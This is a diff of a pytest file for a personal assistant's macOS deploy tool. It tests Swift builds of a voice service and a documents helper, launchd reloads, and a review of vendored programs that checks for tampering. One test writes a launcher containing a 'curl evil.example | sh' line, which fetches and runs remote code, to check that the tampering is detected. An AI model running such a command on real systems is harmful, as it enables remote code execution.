@@ -5,6 +5,7 @@ run for real on a fake checkout in a temporary root."""
 import json
 import os
 import pwd
+import shutil
 import sqlite3
 import subprocess
 from collections.abc import Sequence
@@ -35,6 +36,11 @@ def checkout(tmp_path: Path) -> Path:
         "tools/tapo/pyproject.toml": "",
         "tools/ical/pyproject.toml": "",
         "tools/youtube/pyproject.toml": "",
+        "tools/documents/Package.swift": "// swift-tools-version: 6.2\n",
+        ".gitignore": ".build/\n",  # as ours: a build is never committed
+        "tools/voice/Package.swift": "// swift-tools-version: 6.2\n",
+        "tools/voice/Sources/voice-service/main.swift": "// the voice service\n",
+        "tools/documents/check.pdf": (ROOT / "tools/documents/check.pdf").read_text(encoding="ascii"),
         "docs/brand/estia-avatar.png": "png",
     }.items():
         path = repo / name
@@ -49,17 +55,21 @@ def checkout(tmp_path: Path) -> Path:
         ["git", "-c", "user.name=Alex Example", "-c", "user.email=alex@example.com", "commit", "-qm", "x"],
     ):
         subprocess.run(argv, cwd=repo, check=True)
-    voice = repo / "tools/voice/.build/release"
+    voice = repo / "tools/voice/.build/release"  # the owner's own build, never taken into a release
     (voice / "FluidAudio_FluidAudio.bundle").mkdir(parents=True)
     (voice / "voice-service").write_text("binary")
     (voice / "FluidAudio_FluidAudio.bundle" / "Info.plist").write_text("x")
     return repo
 
 
+CHECKED = {"ok": True, "pages": [{"n": 1, "text": deploy.DOCUMENTS_CHECK_TEXT, "ocr": False}], "skipped": []}
+
+
 class FakeMac(Host):
     """Runs git, tar, rm, mkdir and cp for real (after taking off the sudo/env prefix); fakes uv, the release's
-    Pythons, launchd, ps and the database read; records every argv. A build step takes 30 s of the clock; a restart
-    starts a new bridge process, which writes last_alive when it is healthy."""
+    Pythons, swift (a build leaves its binary behind SwiftPM's `release` link) and the documents helper's answer,
+    launchd, ps and the database read; records every argv. A build step takes 30 s of the clock; a restart starts a
+    new bridge process, which writes last_alive when it is healthy."""
 
     def __init__(
         self,
@@ -69,6 +79,7 @@ class FakeMac(Host):
         clock: "Clock | None" = None,
         restarts: bool = True,
         fails: str = "",
+        loaded: set[str] | None = None,
     ) -> None:
         super().__init__(root, say=lambda text: None)
         self.asked: list[tuple[str, ...]] = []
@@ -78,6 +89,10 @@ class FakeMac(Host):
         self.pid = 4242
         self.restarts = restarts  # whether launchd really starts a new bridge process
         self.fails = fails  # a tool name whose command fails, with a message on stderr
+        self.loaded = loaded  # the services launchd knows (None: every one); a bootstrap loads one
+        self.built: list[str] = []  # the products swift built
+        # what the release's documents helper says when it reads its check page
+        self.documents_answer = (0, json.dumps({**CHECKED, "page_count": 1}) + "\n")
 
     def run(self, argv: Sequence[str], **kwargs: object) -> tuple[int, str]:
         argv = tuple(argv)
@@ -113,13 +128,38 @@ class FakeMac(Host):
             (venv / "python").symlink_to(inner[inner.index("--python") + 1])
             (project / ".venv" / "pyvenv.cfg").write_text(f"home = {Path(inner[inner.index('--python') + 1]).parent}\n")
             return 0, ""
+        if tool == deploy.SWIFT and inner[1] == "build":
+            scratch = Path(inner[inner.index("--scratch-path") + 1])
+            product = inner[inner.index("--product") + 1]
+            products = scratch / "out" / "Products" / "Release"
+            products.mkdir(parents=True)
+            if product == "voice-service":  # its bytes follow the sources it was built from
+                source = Path(inner[inner.index("--package-path") + 1]) / "Sources/voice-service/main.swift"
+                (products / product).write_text(f"#!/bin/sh\n# built from: {source.read_text()}")
+                (products / "FluidAudio_FluidAudio.bundle").mkdir()
+                (products / "FluidAudio_FluidAudio.bundle" / "Info.plist").write_text("built")
+            else:
+                (products / product).write_text("#!/bin/sh\n")
+            (products / product).chmod(0o755)
+            (products / "Core.o").write_text("object")
+            (scratch / "release").symlink_to("out/Products/Release")
+            self.built.append(product)
+            return 0, "Build complete!\n"
+        if tool.endswith("/documents-helper"):
+            return self.documents_answer
         if tool.endswith(("/python", "/python3.13")):
             if "--read-alive" in inner:
                 return (0, f"{self.alive:.0f}\n") if self.healthy else (1, "")
             if "sys.prefix" in " ".join(inner):
                 return 0, str(Path(tool).parents[1]) + "\n"
             return 0, ""
+        if tool == LAUNCHCTL and inner[1] == "bootstrap" and self.loaded is not None:
+            self.loaded.add(Path(inner[-1]).stem)
+        if tool == LAUNCHCTL and inner[1] == "bootout" and self.loaded is not None:
+            self.loaded.discard(inner[-1].removeprefix("system/"))
         if tool == LAUNCHCTL and inner[1] == "print":
+            if self.loaded is not None and inner[-1].removeprefix("system/") not in self.loaded:
+                return 113, f'Could not find service "{inner[-1]}" in domain for system\n'
             return 0, f"\tstate = running\n\tpid = {self.pid}\n"
         if tool == "/bin/ps":
             return 0, f"  {os.getuid()} /x/signal-cli --trust-new-identities on-first-use -a +306900000000 jsonRpc\n"
@@ -188,6 +228,7 @@ def bring_alive(mac: FakeMac, clock: Clock) -> None:
 def test_a_deploy_builds_as_the_owner_freezes_and_switches(tmp_path: Path) -> None:
     root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
     daemons(root)
+    (root / "Library/LaunchDaemons/com.local-assistant.voice.plist").write_text("x")
     mac = FakeMac(root)
     bring_alive(mac, clock)
     assert deployment(root, repo, mac, clock).run() == 0
@@ -198,8 +239,8 @@ def test_a_deploy_builds_as_the_owner_freezes_and_switches(tmp_path: Path) -> No
     assert (release / "src/local_assistant/__init__.py").is_file() and (
         release / "docs/brand/estia-avatar.png"
     ).is_file()
-    assert (release / "tools/voice/.build/release/voice-service").is_file()
-    assert (release / "tools/voice/.build/release/FluidAudio_FluidAudio.bundle/Info.plist").is_file()
+    assert (release / "tools/voice/.build/release/voice-service").read_text().startswith("#!/bin/sh\n# built from")
+    assert (release / "tools/voice/.build/release/FluidAudio_FluidAudio.bundle/Info.plist").read_text() == "built"
     assert (release / ".venv/bin/python").is_symlink() and (release / "tools/tapo/.venv").is_dir()
     youtube = release / "tools/youtube/.venv/bin/python"  # the YouTube helper: built, and checked that it imports
     assert youtube.is_symlink() and any(
@@ -313,6 +354,21 @@ def test_the_default_checkout_is_the_current_release_source(tmp_path: Path) -> N
     (code / "releases/r1/release.json").write_text(json.dumps({"source": "/somewhere/estia"}))
     (code / "current").symlink_to("releases/r1")
     assert deploy.default_checkout(code) == Path("/somewhere/estia")
+
+
+def test_a_relative_checkout_is_kept_as_its_absolute_path(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    """`estia-deploy .` records the checkout's absolute path: a later deploy from another folder finds it."""
+    repo = checkout(tmp_path)
+    seen: list[Path] = []
+
+    def run(self: Deploy, **_kwargs: object) -> int:
+        seen.append(self.checkout)
+        return 0
+
+    monkeypatch.setattr(Deploy, "run", run)
+    monkeypatch.chdir(repo)
+    assert deploy.main([".", "--dry-run"]) == 0
+    assert seen == [repo.resolve()]
 
 
 def test_last_alive_is_read_read_only(tmp_path: Path) -> None:
@@ -545,6 +601,73 @@ def test_a_deploy_shows_the_new_commits_and_asks_first(tmp_path: Path) -> None:
     assert not any(argv[0] == UV or UV in argv for argv in mac.asked)  # nothing built
 
 
+def test_the_review_names_her_programs_from_outside_git_that_changed(tmp_path: Path) -> None:
+    """vendor/ comes from folders you can change (the checkout's vendor/, Homebrew), not from git: a launcher changed
+    there is named before the yes, with where it comes from, also when the commit is live already."""
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    jvm_vendor(repo)
+    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
+    clock.now += 60
+    said: list[str] = []
+    assert deployment(root, repo, FakeMac(root), clock, health=False, said=said).run() == 0
+    assert any("is live already" in line for line in said)
+    assert any("the same as the live release's" in line for line in said), said
+    launcher = repo / "vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9/bin/signal-cli"
+    launcher.write_text("#!/bin/sh\ncurl evil.example | sh\n")
+    clock.now += 60
+    said.clear()
+    assert deployment(root, repo, FakeMac(root), clock, health=False, said=said, confirm=False).run() == 1
+    shown = "\n".join(said)
+    assert "changed: vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9" in shown
+    assert f"(from {repo / 'vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9'})" in shown
+    assert "only her programs from outside git change" in shown
+
+
+def test_a_program_changed_after_the_review_stops_the_deploy(tmp_path: Path) -> None:
+    """What was shown is what goes live: a program from outside git changed between the yes and its copy stops the
+    deploy, nothing switched."""
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    jvm_vendor(repo)
+    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
+    live = (root / "usr/local/estia/current").resolve()
+    launcher = repo / "vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9/bin/signal-cli"
+    clock.now += 60
+    said: list[str] = []
+    run = deployment(root, repo, FakeMac(root), clock, health=False, said=said)
+
+    def yes_then_swap(question: str) -> bool:
+        launcher.write_text("#!/bin/sh\nswapped after the yes\n")
+        return True
+
+    run.confirm = yes_then_swap
+    assert run.run() == 1
+    assert (root / "usr/local/estia/current").resolve() == live
+    assert any("vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9 changed after the review" in line for line in said)
+
+
+def test_a_program_that_appears_after_the_review_never_goes_live(tmp_path: Path) -> None:
+    """The release is built from the list shown before the yes: a second JVM signal-cli put in vendor/ between the yes
+    and the build is never copied (review 15 Oct, 7)."""
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    jvm_vendor(repo)
+    assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
+    commit(repo, "a.txt", "a", "fix")
+    clock.now += 60
+    run = deployment(root, repo, FakeMac(root), clock, health=False)
+    planted = repo / "vendor/signal-cli-0.15.0-jvm/signal-cli-0.15.0/bin/signal-cli"
+
+    def yes_then_plant(question: str) -> bool:
+        planted.parent.mkdir(parents=True)
+        planted.write_text("#!/bin/sh\nplanted after the yes\n")
+        return True
+
+    run.confirm = yes_then_plant
+    assert run.run() == 0
+    release = (root / "usr/local/estia/current").resolve()
+    assert not (release / "vendor/signal-cli-0.15.0-jvm").exists()
+    assert (release / "vendor/signal-cli-0.14.9-jvm/signal-cli-0.14.9/bin/signal-cli").is_file()
+
+
 def test_control_characters_in_commit_subjects_are_not_printed(tmp_path: Path) -> None:
     root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
     assert deployment(root, repo, FakeMac(root), clock, health=False).run() == 0
@@ -571,6 +694,9 @@ def test_each_deploy_renders_the_service_files_and_reloads_one_that_changed(tmp_
     assert deployment(root, repo, mac, clock).run() == 0
     bridge = folder / "com.local-assistant.bridge.plist"
     assert b"<string>_estia</string>" in bridge.read_bytes()
+    assert b"<string>/var/log/estia/launchd.log</string>" in bridge.read_bytes()
+    for name in ("launchd.log", "voice.log"):  # made before launchd opens them (an install from before moves here)
+        assert (root / "var/log/estia" / name).is_file()
     assert (LAUNCHCTL, "bootout", "system/com.local-assistant.bridge") in mac.asked
     assert (LAUNCHCTL, "bootstrap", "system", "/Library/LaunchDaemons/com.local-assistant.bridge.plist") in mac.asked
     clock.now += 60
@@ -582,15 +708,147 @@ def test_each_deploy_renders_the_service_files_and_reloads_one_that_changed(tmp_
 
 
 @pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
-def test_a_new_voice_binary_restarts_the_voice_service(tmp_path: Path) -> None:
+def test_a_log_folder_that_cannot_be_made_stops_the_deploy_before_the_switch(tmp_path: Path) -> None:
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    installed_plists(root)
+    assert deployment(root, repo, FakeMac(root), clock).run() == 0
+    live = (root / "usr/local/estia/current").resolve()
+    shutil.rmtree(root / "var/log/estia")
+    (root / "var/log/estia").symlink_to(tmp_path)  # only root could do this on the Mac: refused all the same
+    clock.now += 60
+    said: list[str] = []
+    mac = FakeMac(root)
+    assert deployment(root, repo, mac, clock, said=said).run() == 1
+    assert (root / "usr/local/estia/current").resolve() == live
+    assert not any(argv[0] == LAUNCHCTL and argv[1] != "print" for argv in mac.asked)
+    assert any(line.startswith("✗ deploy stopped, nothing switched: /var/log/estia") for line in said), said
+
+
+@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
+def test_a_second_name_her_account_gave_her_log_never_stops_the_deploy(tmp_path: Path) -> None:
+    """`ln /var/log/estia/launchd.log ~/x` as her (the same volume): the deploy still goes live (review 15 Oct, 5)."""
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    installed_plists(root)
+    assert deployment(root, repo, FakeMac(root), clock).run() == 0
+    live = (root / "usr/local/estia/current").resolve()
+    os.link(root / "var/log/estia/launchd.log", tmp_path / "hers")
+    commit(repo, "a.txt", "a", "fix")
+    clock.now += 60
+    assert deployment(root, repo, FakeMac(root), clock).run() == 0
+    assert (root / "usr/local/estia/current").resolve() != live
+    assert (root / "var/log/estia/launchd.log").stat().st_nlink == 1
+
+
+@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
+def test_an_unchanged_service_that_is_not_loaded_is_bootstrapped(tmp_path: Path) -> None:
+    """A kickstart of a service launchd does not know fails: an unchanged service file that is not loaded (a failed
+    try, a bootout by hand) is loaded again instead, and the rollback after a failed check does the same."""
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    installed_plists(root)
+    assert deployment(root, repo, FakeMac(root), clock).run() == 0
+    clock.now += 60
+    mac = FakeMac(root, loaded=set())
+    assert deployment(root, repo, mac, clock).run() == 0
+    bootstrap = (LAUNCHCTL, "bootstrap", "system", "/Library/LaunchDaemons/com.local-assistant.bridge.plist")
+    assert bootstrap in mac.asked
+    assert (LAUNCHCTL, "kickstart", "-k", "system/com.local-assistant.bridge") not in mac.asked
+    gone = FakeMac(root, loaded=set())  # the switch back after a failed check restarts the same way
+    deployment(root, repo, gone, clock).restart()
+    assert gone.asked[-1] == bootstrap
+
+
+def voice_tree(repo: Path) -> str:
+    done = subprocess.run(
+        ["git", "rev-parse", "HEAD:tools/voice"], cwd=repo, capture_output=True, text=True, check=True
+    )
+    return done.stdout.strip()
+
+
+@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
+def test_the_voice_service_is_built_from_the_commits_own_sources(tmp_path: Path) -> None:
+    """Never the checkout's own build (a dirty tree, another branch, an older pull): the commit's tools/voice, built
+    as the owner with the exact versions in its Package.resolved; its binary and bundles kept, the build's own files
+    not. release.json records the tree it came from."""
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    installed_plists(root, voice=True)
+    mac = FakeMac(root)
+    assert deployment(root, repo, mac, clock).run() == 0
+    release = (root / "usr/local/estia/current").resolve()
+    built = [argv for argv in mac.asked if deploy.SWIFT in argv and "voice-service" in argv]
+    assert len(built) == 1 and built[0][:5] == (SUDO, "-u", ME, "-H", "--")
+    assert built[0][built[0].index(deploy.SWIFT) :] == (
+        deploy.SWIFT,
+        "build",
+        "-c",
+        "release",
+        "--force-resolved-versions",
+        "--package-path",
+        str(release / "tools/voice"),
+        "--scratch-path",
+        str(release / ".voice-build"),
+        "--product",
+        "voice-service",
+    )
+    binary = release / "tools/voice/.build/release/voice-service"
+    assert binary.read_text() == "#!/bin/sh\n# built from: // the voice service\n" and os.access(binary, os.X_OK)
+    assert sorted(p.name for p in binary.parent.iterdir()) == ["FluidAudio_FluidAudio.bundle", "voice-service"]
+    assert not (release / ".voice-build").exists()
+    meta = json.loads((release / "release.json").read_text())
+    assert meta["voice"] is True and meta["voice_tree"] == voice_tree(repo)
+
+
+@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
+def test_an_unchanged_voice_tree_takes_the_live_releases_build(tmp_path: Path) -> None:
+    """The same tools/voice as the live release: its root-owned build is copied (no rebuild, no restart: the Neural
+    Engine compiles a new voice again)."""
     root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
     installed_plists(root, voice=True)
     assert deployment(root, repo, FakeMac(root), clock).run() == 0
-    (repo / "tools/voice/.build/release/voice-service").write_text("binary 2")
+    first = (root / "usr/local/estia/current").resolve() / "tools/voice/.build/release/voice-service"
+    commit(repo, "a.txt", "a", "not the voice")
     clock.now += 60
     mac = FakeMac(root)
     assert deployment(root, repo, mac, clock).run() == 0
+    second = (root / "usr/local/estia/current").resolve()
+    assert "voice-service" not in mac.built
+    assert (second / "tools/voice/.build/release/voice-service").read_bytes() == first.read_bytes()
+    assert (second / "tools/voice/.build/release/FluidAudio_FluidAudio.bundle/Info.plist").is_file()
+    assert json.loads((second / "release.json").read_text())["voice_tree"] == voice_tree(repo)
+    assert not any(argv[-1] == "system/com.local-assistant.voice" for argv in mac.asked)
+
+
+@pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
+def test_a_changed_voice_tree_builds_it_again_and_restarts_the_voice_service(tmp_path: Path) -> None:
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    installed_plists(root, voice=True)
+    assert deployment(root, repo, FakeMac(root), clock).run() == 0
+    commit(repo, "tools/voice/Sources/voice-service/main.swift", "// fixed\n", "voice: a fix")
+    clock.now += 60
+    mac = FakeMac(root)
+    assert deployment(root, repo, mac, clock).run() == 0
+    binary = (root / "usr/local/estia/current").resolve() / "tools/voice/.build/release/voice-service"
+    assert "voice-service" in mac.built and binary.read_text().endswith("// fixed\n")
     assert (LAUNCHCTL, "kickstart", "-k", "system/com.local-assistant.voice") in mac.asked
+
+
+def test_a_failed_voice_build_stops_the_deploy(tmp_path: Path) -> None:
+    """Her voice service runs from `current`: a release without its program is never switched to."""
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    installed_plists(root, voice=True)
+    said: list[str] = []
+    assert deployment(root, repo, FakeMac(root, fails="swift"), clock, said=said).run() == 1
+    assert not (root / "usr/local/estia/current").exists()
+    assert any(line.startswith("✗ deploy stopped, nothing switched: swift build -c … failed") for line in said)
+
+
+def test_without_a_voice_service_no_voice_is_built(tmp_path: Path) -> None:
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    daemons(root)
+    mac = FakeMac(root)
+    assert deployment(root, repo, mac, clock, health=False).run() == 0
+    release = (root / "usr/local/estia/current").resolve()
+    assert "voice-service" not in mac.built and not (release / "tools/voice/.build").exists()
+    assert json.loads((release / "release.json").read_text())["voice"] is False
 
 
 @pytest.mark.skipif(not Path("/usr/bin/plutil").exists(), reason="plutil is macOS only")
@@ -609,7 +867,7 @@ def test_a_deploy_with_a_new_voice_binary_says_when_calls_work(tmp_path: Path) -
     assert clock.now - started >= ownuser.VOICE_WAIT_SECONDS  # still loading when the bridge counts a long load
     clock.now += 60
     said.clear()
-    (repo / "tools/voice/.build/release/voice-service").write_text("binary 1b")
+    commit(repo, "tools/voice/Sources/voice-service/main.swift", "// 1b\n", "voice 1b")
     no_calls = deployment(root, repo, FakeMac(root), clock, said=said)
     no_calls.voice_health = lambda: {"stt": "loading", "tts": "loading"}
     no_calls.her_calls = lambda: False  # no [calls]: no text follows, none is promised
@@ -621,7 +879,7 @@ def test_a_deploy_with_a_new_voice_binary_says_when_calls_work(tmp_path: Path) -
     same.voice_health = lambda: {"stt": "loading", "tts": "loading"}
     assert same.run() == 0
     assert ownuser.VOICE_LOADING not in said and not any(line.startswith("voice:") for line in said)
-    (repo / "tools/voice/.build/release/voice-service").write_text("binary 2")
+    commit(repo, "tools/voice/Sources/voice-service/main.swift", "// 2\n", "voice 2")
     clock.now += 60
     said.clear()
     new = deployment(root, repo, FakeMac(root), clock, said=said)
@@ -715,3 +973,140 @@ def test_a_dry_run_of_a_later_deploy_claims_no_changes_it_cannot_see(
     out = capsys.readouterr().out
     assert "root-run tools differ" not in out
     assert "system/com.local-assistant.voice" not in out  # the same voice binary: not restarted
+
+
+# ------------------------------------------------------------------ the documents helper (tools/documents)
+
+
+def test_a_deploy_builds_the_documents_helper_from_the_commit_and_reads_its_check_page(tmp_path: Path) -> None:
+    """Built as the owner from the commit's own sources (never the checkout's build), its binary alone kept where the
+    config's default looks (the same path as in a checkout), then run once on tools/documents/check.pdf."""
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    daemons(root)
+    mac = FakeMac(root)
+    bring_alive(mac, clock)
+    said: list[str] = []
+    assert deployment(root, repo, mac, clock, said=said).run() == 0
+    release = (root / "usr/local/estia/current").resolve()
+    helper = release / "tools/documents/.build/release/documents-helper"
+    assert helper.is_file() and not helper.parent.is_symlink() and os.access(helper, os.X_OK)
+    assert sorted(path.name for path in (release / "tools/documents/.build").rglob("*")) == [
+        "documents-helper",
+        "release",
+    ]  # the binary alone: none of the build's own files
+    assert not (release / ".documents-build").exists()
+    built = [argv for argv in mac.asked if deploy.SWIFT in argv]
+    assert len(built) == 1 and built[0][:5] == (SUDO, "-u", ME, "-H", "--") and built[0][5:7] == (ENV, "-i")
+    assert built[0][built[0].index(deploy.SWIFT) :] == (
+        deploy.SWIFT,
+        "build",
+        "-c",
+        "release",
+        "--package-path",
+        str(release / "tools/documents"),
+        "--scratch-path",
+        str(release / ".documents-build"),
+        "--product",
+        "documents-helper",
+    )
+    checked = [argv for argv in mac.asked if argv[-7:-5] == (str(helper), "read")]
+    assert len(checked) == 1 and checked[0][:5] == (SUDO, "-u", ME, "-H", "--")
+    assert checked[0][checked[0].index(str(helper)) :] == (
+        str(helper),
+        "read",
+        str(release / "tools/documents/check.pdf"),
+        "--max-pages",
+        "300",
+        "--max-seconds",
+        "60",
+    )
+    assert json.loads((release / "release.json").read_text())["documents"] is True
+    assert any(line.startswith(f"release {release.name}:") and "documents yes" in line for line in said)
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        (1, '{"error":"unreadable","ok":false}\n'),
+        (0, json.dumps({**CHECKED, "page_count": 1, "pages": [{"n": 1, "text": "", "ocr": True}]}) + "\n"),
+        (0, "Segmentation fault\n"),
+    ],
+)
+def test_a_documents_helper_that_does_not_read_its_check_page_is_left_out_of_the_release(
+    tmp_path: Path, answer: tuple[int, str]
+) -> None:
+    """Documents are an extra: a helper that cannot read its check page is not kept, and the release goes live
+    without it (release.json says so; doctor names it)."""
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    mac = FakeMac(root)
+    mac.documents_answer = answer
+    said: list[str] = []
+    assert deployment(root, repo, mac, clock, health=False, said=said).run() == 0
+    release = (root / "usr/local/estia/current").resolve()
+    assert not (release / "tools/documents/.build").exists() and not (release / ".documents-build").exists()
+    assert json.loads((release / "release.json").read_text())["documents"] is False
+    assert any(line.startswith("! the documents helper was not built: it did not read its check page") for line in said)
+    assert any("documents no" in line for line in said), said
+
+
+def test_a_failed_documents_build_leaves_documents_out_and_goes_live(tmp_path: Path) -> None:
+    """An older Swift (the helper needs 6.0) or any build failure never stops a release: documents are an extra."""
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    said: list[str] = []
+    assert deployment(root, repo, FakeMac(root, fails="swift"), clock, health=False, said=said).run() == 0
+    release = (root / "usr/local/estia/current").resolve()
+    assert not (release / ".documents-build").exists() and not (release / "tools/documents/.build").exists()
+    assert json.loads((release / "release.json").read_text())["documents"] is False
+    warning = next(line for line in said if line.startswith("! the documents helper was not built: swift build -c"))
+    assert "network unreachable" in warning and "Swift 6.0 or later" in warning and "doctor" in warning
+
+
+def test_the_documents_helper_needs_only_swift_6_0() -> None:
+    """Nothing in tools/documents is newer than Swift 6.0 (typed throws, Swift Testing, swiftLanguageMode): a Mac
+    whose Command Line Tools carry Swift 6.0 or 6.1 builds it too."""
+    first = (ROOT / "tools/documents/Package.swift").read_text().splitlines()[0]
+    assert first == "// swift-tools-version: 6.0"
+
+
+def test_a_commit_without_the_documents_helper_builds_none(tmp_path: Path) -> None:
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    for argv in (
+        ["git", "rm", "-rq", "tools/documents"],
+        ["git", "-c", "user.name=Alex Example", "-c", "user.email=alex@example.com", "commit", "-qm", "older"],
+    ):
+        subprocess.run(argv, cwd=repo, check=True)
+    mac = FakeMac(root)
+    said: list[str] = []
+    assert deployment(root, repo, mac, clock, health=False, said=said).run() == 0
+    release = (root / "usr/local/estia/current").resolve()
+    assert not any(deploy.SWIFT in argv for argv in mac.asked)
+    assert json.loads((release / "release.json").read_text())["documents"] is False
+    assert any("documents no" in line for line in said)
+
+
+def test_a_dry_run_names_the_documents_build(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    root, repo, clock = tmp_path / "root", checkout(tmp_path), Clock()
+    run = Deploy(
+        Host(root, dry_run=True),
+        Builder(ME, tmp_path / "owner-home", os.getuid()),
+        repo,
+        uv=UV,
+        clock=clock,
+        sleep=clock.sleep,
+        as_root=True,
+        check_health=False,
+        brew=tmp_path / "no-homebrew",
+    )
+    assert run.run() == 0
+    out = capsys.readouterr().out
+    assert f"{deploy.SWIFT} build -c release --package-path" in out and "documents-helper read" in out
+    assert not root.exists()
+
+
+def test_the_configs_default_documents_helper_is_the_one_a_release_holds() -> None:
+    """One path for both: a checkout (scripts/run.sh's swift build) and a release (estia-deploy's copy)."""
+    from local_assistant import config
+
+    assert config.Config(bot_number="+306900000000", allowed_acis=frozenset()).documents_helper == (
+        str(config.CODE_ROOT / deploy.DOCUMENTS_BINARY),
+    )
